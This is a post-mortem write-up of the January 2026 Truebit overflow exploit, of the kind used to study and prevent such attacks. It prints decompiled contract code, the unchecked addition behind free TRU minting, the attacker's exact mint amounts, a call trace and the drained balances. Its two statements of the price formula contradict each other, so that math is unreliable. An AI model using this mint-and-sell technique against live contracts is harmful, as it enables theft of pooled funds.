# Truebit 26.44M PoC

## Summary

| Attribute | Value |
|-----------|-------|
| **Date** | January 8, 2026 |
| **Protocol** | Truebit Protocol |
| **Chain** | Ethereum |
| **Loss** | ~8,535 ETH (~$26.44M USD) |
| **Attack Transaction** | [0xcd4755645595094a8ab984d0db7e3b4aabde72a5c87c4f176a030629c47fb014](https://etherscan.io/tx/0xcd4755645595094a8ab984d0db7e3b4aabde72a5c87c4f176a030629c47fb014) |

---

### What is Truebit Protocol?

Truebit Protocol is a decentralized off-chain computation marketplace designed to move complex computational tasks away from the blockchain mainnet and execute them off-chain, while ensuring the correctness of results through economic incentive mechanisms.

The protocol uses a native token called **TRU**, which follows an algorithmic elastic supply model. The price of TRU is dynamically determined by the ratio of ETH reserves held in the contract to the circulating supply of TRU.

### Token Mechanics

- **Minting**: Users deposit ETH into the Purchase contract and receive TRU tokens at an algorithmically-determined price
- **Burning**: Users burn their TRU tokens and withdraw ETH from the contract at the algorithmic price

### Contracts

| Contract | Address | Role |
|----------|---------|------|
| Purchase (Proxy) | `0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2` | Main entry point for buy/sell |
| Purchase (Implementation) | `0xC186e6F0163e21be057E95aA135eDD52508D14d3` | Logic implementation |
| TRU Token (Proxy) | `0xf65B5C5104c4faFD4b709d9D60a185eAE063276c` | TRU token contract |
| TRU Token (Implementation) | `0x18ceDF1071EC25331130C82D7AF71D393Ccd4446` | Token logic |

---

## Analysis

// Price Calculation Formula

The Purchase contract uses the following formula to calculate the ETH required to mint TRU tokens:

```
Price = (100 * A² * R + 200 * A * R * S) / ((100 - T) * S²)
```

Where:
- **A** (AmountIn): Number of tokens to mint
- **R** (Reserve): Current ETH reserve in the contract
- **S** (Supply): Current total supply of TRU
- **T** (THETA): Protocol parameter, fixed at 75

### Root cause

The vulnerable contract was compiled with **Solidity 0.6.10** and decompiled from the implementation at `0xC186e6F0163e21be057E95aA135eDD52508D14d3`.

#### Storage Variables

```solidity
uint256 _setParameters;  // STORAGE[0x98] - THETA parameter (75)
uint256 stor_99;         // STORAGE[0x99] - Price floor
uint256 _reserve;        // STORAGE[0x9a] - ETH reserve
address stor_97_0_19;    // STORAGE[0x97] - TRU token address
```

#### SafeMath Functions

```solidity
function _SafeMul(uint256 varg0, uint256 varg1) private {
    if (varg1 != 0) {
        assert(varg1);
        require(varg1 * varg0 / varg1 == varg0, Error('SafeMath: multiplication overflow'));
        return varg1 * varg0;
    } else {
        return 0;
    }
}

function _SafeDiv(uint256 varg0, uint256 varg1) private {
    if (varg0 > 0) {
        assert(varg0);
        return varg1 / varg0;
    } else {
        revert(Error('SafeMath: division by zero'));
    }
}

function _SafeAdd(uint256 varg0, uint256 varg1) private {
    require(varg1 + varg0 >= varg1, Error('SafeMath: addition overflow'));
    return varg1 + varg0;
}

function _SafeSub(uint256 varg0, uint256 varg1) private {
    if (varg0 <= varg1) {
        return varg1 - varg0;
    } else {
        revert(Error('SafeMath: subtraction overflow'));
    }
}
```

### `getPurchasePrice` (selector: 0x1446)

```solidity
function 0x1446(uint256 varg0) private {
    // Step 1: Get total supply from TRU token
    require(bool(stor_97_0_19.code.size));
    v0, /* uint256 */ v1 = stor_97_0_19.totalSupply().gas(msg.gas);
    require(bool(v0), 0, RETURNDATASIZE());
    require(RETURNDATASIZE() >= 32);

    // Step 2: Calculate denominator part: (THETA - 100) * S²
    v2 = _SafeMul(v1, v1);                    // v2 = S * S = S²
    v3 = _SafeMul(_setParameters, v2);        // v3 = THETA * S² (THETA = 75)
    v4 = _SafeMul(v1, v1);                    // v4 = S * S = S²
    v5 = _SafeMul(100, v4);                   // v5 = 100 * S²
    v6 = _SafeSub(v3, v5);                    // v6 = THETA*S² - 100*S² = (THETA-100)*S²

    // Step 3: Calculate first term of numerator: 200 * A * R * S
    v7 = _SafeMul(varg0, _reserve);           // v7 = A * R
    v8 = _SafeMul(v1, v7);                    // v8 = S * A * R
    v9 = _SafeMul(200, v8);                   // v9 = 200 * S * A * R  ✓ SafeMath

    // Step 4: Calculate second term of numerator: 100 * A² * R
    v10 = _SafeMul(varg0, _reserve);          // v10 = A * R
    v11 = _SafeMul(varg0, v10);               // v11 = A * A * R = A² * R
    v12 = _SafeMul(100, v11);                 // v12 = 100 * A² * R  ✓ SafeMath

    // Step 5: VULNERABLE LINE - Addition without SafeMath!
    v13 = _SafeDiv(v6, v12 + v9);             // BUG: v12 + v9 uses native + operator!
    //                 ^^^^^^^^
    //                 NO _SafeAdd() - INTEGER OVERFLOW POSSIBLE!

    return v13;
}
```

The vulnerability is on the **final calculation line**:

```solidity
v13 = _SafeDiv(v6, v12 + v9);
```

| Component | Value | SafeMath Protected? |
|-----------|-------|---------------------|
| `v12` | `100 * A² * R` | Yes (`_SafeMul`) |
| `v9` | `200 * S * A * R` | Yes (`_SafeMul`) |
| `v12 + v9` | Sum of both terms | **NO!** Native `+` operator |
| `_SafeDiv(v6, ...)` | Division | Yes (`_SafeDiv`) |

The contract has `_SafeAdd()` defined but **does not use it** for this critical addition:

```solidity
// What the code does (VULNERABLE):
v13 = _SafeDiv(v6, v12 + v9);

// What the code SHOULD do (SECURE):
v13 = _SafeDiv(v6, _SafeAdd(v12, v9));
```

### Mathematical Formula

The price calculation implements:

```
Price = (THETA - 100) * S² / (100 * A² * R + 200 * A * R * S)

Where:
  A = AmountIn (tokens to mint)
  R = _reserve (ETH reserve in contract)
  S = totalSupply (current TRU supply)
  THETA = _setParameters = 75
```

Simplified:
```
Price = -25 * S² / (100 * A² * R + 200 * A * R * S)
```

### Overflow Mechanism

In Solidity < 0.8.0, when `v12 + v9` exceeds `2²⁵⁶ - 1`:

```
uint256 MAX = 2²⁵⁶ - 1 = 115792089237316195423570985008687907853269984665640564039457584007913129639935

If v12 + v9 > MAX:
    result = (v12 + v9) % 2²⁵⁶
    result → small number (wraps around)

When result ≈ 0:
    _SafeDiv(v6, ~0) → very large number OR
    The division result becomes 0 after integer division
```

### First Attack Cycle

**Parameters at block 24191017:**
```
A (AmountIn)     = 240,442,509,453,545,333,947,284,131
R (_reserve)     = 8,539,452,648,748,044,247,863 wei (~8,539 ETH)
S (totalSupply)  = 161,753,242,367,424,992,669,183,203
THETA            = 75
```

**Calculation:**
```
v2  = S * S = S²
v3  = 75 * S²
v5  = 100 * S²
v6  = 75*S² - 100*S² = -25*S² (negative, but stored as large uint256)

v9  = 200 * S * A * R
    = 200 * 161753242367424992669183203 * 240442509453545333947284131 * 8539452648748044247863
    = [EXTREMELY LARGE NUMBER]

v12 = 100 * A * A * R
    = 100 * 240442509453545333947284131² * 8539452648748044247863
    = [EXTREMELY LARGE NUMBER]

v12 + v9 > 2²⁵⁶ - 1  →  OVERFLOW!
         → wraps to small value

Price = v6 / (small value after overflow)
      = 0 (after integer division)
```

**Result**: The attacker mints 2.4×10²⁶ TRU tokens for **0 ETH**.

---

## Attack Execution

| Attribute | Value |
|-----------|-------|
| Attacker EOA | `0x6C8EC8f14bE7C01672d31CFa5f2CEfeAB2562b50` |
| Attack Contract | `0x1De399967B206e446B4E9AeEb3Cb0A0991bF11b8` |
| Initial Funding | 0.01 ETH |

### `buyTRU` function (selector: 0xa0296215)

```solidity
function 0xa0296215(uint256 varg0) public payable {
    require(msg.data.length - 4 >= 32);

    // Calculate price using vulnerable function
    v0 = 0x1446(varg0);  // getPurchasePrice - returns 0 due to overflow!

    // Require exact ETH payment (0 ETH required!)
    require(msg.value == v0, Error('ETH payment does not match TRU order'));

    // Update reserve
    v1 = _SafeMul(100 - _setParameters, msg.value);  // 25 * 0 = 0
    v2 = _SafeDiv(100, v1);                          // 0 / 100 = 0
    v3 = _SafeAdd(v2, _reserve);                     // reserve + 0
    _reserve = v3;

    // Mint tokens to attacker - NO COST!
    require(bool(stor_97_0_19.code.size));
    v4 = stor_97_0_19.mint(msg.sender, varg0).gas(msg.gas);
    require(bool(v4), 0, RETURNDATASIZE());

    return msg.value;
}
```

### `sellTRU` function (selector: 0xc471b10b)

```solidity
function 0xc471b10b(uint256 varg0) public nonPayable {
    require(msg.data.length - 4 >= 32);

    // Check allowance
    require(bool(stor_97_0_19.code.size));
    v0, v1 = stor_97_0_19.allowance(msg.sender, address(this)).gas(msg.gas);
    require(bool(v0), 0, RETURNDATASIZE());
    require(RETURNDATASIZE() >= 32);
    require(v1 >= varg0, Error('Insufficient TRU allowance'));

    // Calculate ETH to return (uses different formula - not vulnerable)
    v2 = 0x1374(varg0);  // getSellPrice - returns fair value!

    // Update reserve
    v3 = _SafeSub(v2, _reserve);
    _reserve = v3;

    // Transfer and burn tokens
    require(bool(stor_97_0_19.code.size));
    v4, v5 = stor_97_0_19.transferFrom(msg.sender, address(this), varg0).gas(msg.gas);
    require(bool(v4), 0, RETURNDATASIZE());
    require(RETURNDATASIZE() >= 32);

    require(bool(stor_97_0_19.code.size));
    v6 = stor_97_0_19.burn(varg0).gas(msg.gas);
    require(bool(v6), 0, RETURNDATASIZE());

    // Send ETH to seller - ATTACKER RECEIVES FULL VALUE!
    v7 = msg.sender.call().value(v2).gas(!v2 * 2300);
    require(bool(v7), 0, RETURNDATASIZE());

    return v2;
}
```

### Execution Flow

```
┌─────────────────────────────────────────────────────────────────────┐
│  ┌──────────────┐                                                   │
│  │   Attacker   │                                                   │
│  └──────┬───────┘                                                   │
│         │                                                           │
│         │ 1. Call attack() with 0.01 ETH                            │
│         ▼                                                           │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │                    EXPLOIT LOOP (x5)                         │   │
│  │                                                              │   │
│  │   ┌─────────────────────────────────────────────────────┐    │   │
│  │   │ Step 1: getPurchasePrice(crafted_amount)            │    │   │
│  │   │         → Returns 0 (due to overflow)               │    │   │
│  │   └─────────────────────────────────────────────────────┘    │   │
│  │                          │                                   │   │
│  │                          ▼                                   │   │
│  │   ┌─────────────────────────────────────────────────────┐    │   │
│  │   │ Step 2: buyTRU(crafted_amount)                      │    │   │
│  │   │         → Mint massive TRU for 0 ETH                │    │   │
│  │   └─────────────────────────────────────────────────────┘    │   │
│  │                          │                                   │   │
│  │                          ▼                                   │   │
│  │   ┌─────────────────────────────────────────────────────┐    │   │
│  │   │ Step 3: approve(Purchase, amount)                   │    │   │
│  │   └─────────────────────────────────────────────────────┘    │   │
│  │                          │                                   │   │
│  │                          ▼                                   │   │
│  │   ┌─────────────────────────────────────────────────────┐    │   │
│  │   │ Step 4: sellTRU(amount)                             │    │   │
│  │   │         → Burn TRU, receive ETH at fair price       │    │   │
│  │   └─────────────────────────────────────────────────────┘    │   │
│  │                                                              │   │
│  └──────────────────────────────────────────────────────────────┘   │
│         │                                                           │
│         ▼                                                           │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │              PROFIT: ~8,535 ETH ($26.44M)                    │   │
│  └──────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────┘
```

### Cycle-by-Cycle

| Cycle | Tokens Minted | Price Paid | ETH Received | Profit |
|-------|---------------|------------|--------------|--------|
| 1 | 240,442,509,453,545,333,947,284,131 | 0 | 5,105 ETH | 5,105 ETH |
| 2 | 441,010,174,513,890,026,925,958,238 | 6 wei | 2,512 ETH | 2,512 ETH |
| 3 | 970,752,178,501,023,300,932,298,000 | ~0.0003 ETH | 789 ETH | 789 ETH |
| 4 | 2,808,567,055,501,947,160,504,720,479 | ~0.015 ETH | 124 ETH | 124 ETH |
| 5 | 12,548,923,878,784,675,664,886,517,494 | ~5.1 ETH | 8.3 ETH | 3.2 ETH |
| **Total** | | **~5.1 ETH** | **~8,538 ETH** | **~8,535 ETH** |

### Trace Analysis

```
[580922] 0x1De399967B206e446B4E9AeEb3Cb0A0991bF11b8::attack{value: 10000000000000000}

├─ getPurchasePrice(240442509453545333947284131) → 0
├─ buyTRU(240442509453545333947284131)
│   └─ mint(attacker, 240442509453545333947284131) ✓
├─ approve(Purchase, amount) ✓
├─ sellTRU(240442509453545333947284131)
│   ├─ transferFrom(attacker, Purchase, amount) ✓
│   ├─ burn(amount) ✓
│   └─ fallback{value: 5105068625198012951390}() → 5,105 ETH received!
```

---

```

### Results

```
=== Vulnerability Check ===
Price for AMOUNT_1: 0
Is Vulnerable: true

=== Full Exploit Reproduction ===
--- Before Attack ---
TRU Total Supply: 161753242367424992669183203
Purchase ETH Balance: 8539 ETH
Attacker Balance: 1 ETH

--- After Attack ---
TRU Total Supply: 161753242367424992669183203
Purchase ETH Balance: 3 ETH
Attacker Balance: 8536 ETH

--- Results ---
Total Profit: 8535 ETH ✓
```

### Exploit Amounts (Decimal)

```
Amount 1: 240,442,509,453,545,333,947,284,131
Amount 2: 441,010,174,513,890,026,925,958,238
Amount 3: 970,752,178,501,023,300,932,298,000
Amount 4: 2,808,567,055,501,947,160,504,720,479
Amount 5: 12,548,923,878,784,675,664,886,517,494
```

---

## 5. Fund Flow Analysis

### 5.1 Post-Attack Movement

```
┌─────────────────────────────────────────────────────────────────────┐
│  ┌─────────────────┐                                                │
│  │ Attack Contract │                                                │
│  │    8,535 ETH    │                                                │
│  └────────┬────────┘                                                │
│           │                                                         │
│           ▼                                                         │
│  ┌─────────────────┐                                                │
│  │  Attacker EOA   │                                                │
│  │ 0x6C8EC8...b50  │                                                │
│  └────────┬────────┘                                                │
│           │                                                         │
│     ┌─────┴─────┬─────────────┐                                     │
│     ▼           ▼             ▼                                     │
│  ┌──────┐   ┌──────┐     ┌──────┐                                   │
│  │Addr 1│   │Addr 2│     │Addr 3│                                   │
│  └───┬──┘   └───┬──┘     └───┬──┘                                   │
│      │          │            │                                      │
│      └──────────┴─────┬──────┘                                      │
│                       ▼                                             │
│              ┌─────────────────┐                                    │
│              │  TORNADO CASH   │                                    │
│              │   (Laundered)   │                                    │
│              └─────────────────┘                                    │
└─────────────────────────────────────────────────────────────────────┘
```

## References

- [SlowMist Analysis](https://slowmist.medium.com/26-44-million-stolen-truebit-protocol-smart-contract-vulnerability-analysis-e44fe7becd8a)
- [Attack Transaction on Etherscan](https://etherscan.io/tx/0xcd4755645595094a8ab984d0db7e3b4aabde72a5c87c4f176a030629c47fb014)
- [Truebit Protocol](https://truebit.io/)
- [OpenZeppelin SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math)
- [Solidity 0.8.0 Breaking Changes](https://docs.soliditylang.org/en/v0.8.0/080-breaking-changes.html)
